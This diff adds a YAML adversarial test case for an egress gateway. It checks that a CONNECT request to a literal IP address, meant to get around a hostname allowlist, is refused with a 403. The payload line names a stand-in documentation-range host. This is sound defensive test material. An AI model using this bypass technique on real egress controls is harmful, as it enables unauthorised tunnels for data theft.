@@ -1,0 +1,28 @@
+# de_egress_literal_ip_connect_refused.yaml — dlp_egress adversarial payload.
+# Spec C §4.1 (mode-(a) provider forward-proxy), §9 class 5 (raw-IP / literal-IP
+# CONNECT bypass). Schema: tests/adversarial/payload_schema.py.
+id: de-2026-015
+category: dlp_egress
+threat: >-
+  A compromised in-core egress client issues a CONNECT to a literal IP address to
+  bypass the hostname-based destination allowlist (and the gateway-side DNS +
+  resolved-IP-globally-routable guard); the gateway L7 forward-proxy refuses the
+  literal-IP CONNECT with a 403 before any tunnel opens.
+ingestion_path: mcp.tool.output
+payload:
+  attack: literal_ip_connect_bypasses_hostname_allowlist
+  connect_request: "CONNECT 203.0.113.5:443 HTTP/1.1"
+  literal_ip_target: "203.0.113.5"
+expected_outcome: refused
+provenance: >-
+  Spec C §4.1 (the proxy allowlist is hostname-based and the proxy resolves the
+  host itself) + §9 class 5. A literal-IP CONNECT target is refused at
+  EgressForwardProxy._authorize (EgressDenyReason.LITERAL_IP_TARGET, HTTP 403).
+  Elevates the unit-level
+  tests/unit/gateway/test_egress_proxy.py::test_connect_literal_ip_denied into
+  the release-blocking adversarial corpus. 203.0.113.5 is RFC 5737 TEST-NET-3
+  (documentation range — never a real host).
+references:
+  - "docs/superpowers/specs/2026-06-25-spec-c-egress-control-plane-design.md §4.1, §9"
+  - "src/alfred/gateway/egress_proxy.py (EgressForwardProxy._authorize)"
+  - "src/alfred/egress/allowlist.py (is_literal_ip)"
